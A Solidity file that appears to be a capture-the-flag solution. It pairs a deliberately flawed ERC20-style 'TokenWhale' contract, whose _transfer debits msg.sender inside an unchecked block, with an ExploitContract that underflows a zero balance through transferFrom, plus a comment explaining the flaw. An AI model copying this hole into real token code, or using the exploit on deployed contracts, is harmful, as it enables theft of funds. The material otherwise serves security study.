// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

// In this challenge, the TokenWhale contract harbored a critical vulnerability within its _transfer internal overflow allowing for an overflow exploit.
// the player granting the ExploitContract permission to transfer tokens, a flaw occurred when the transferFrom function
// internally called _transfer. Instead of reducing the balance of the 'from' address, the function
// reduced the balance of msg.sender (the ExploitContract), which was already zero. triggered an overflow condition. Resulting in setting balance of ExploitContract to large number.
contract ExploitContract {
    TokenWhale public tokenWhale;

    constructor(TokenWhale _tokenWhale) {
        tokenWhale = _tokenWhale;
    }

    function hack(address from, address to, uint256 value) external {
        tokenWhale.transferFrom(from, to, value);
        tokenWhale.transfer(from, 1000000);
    }
}
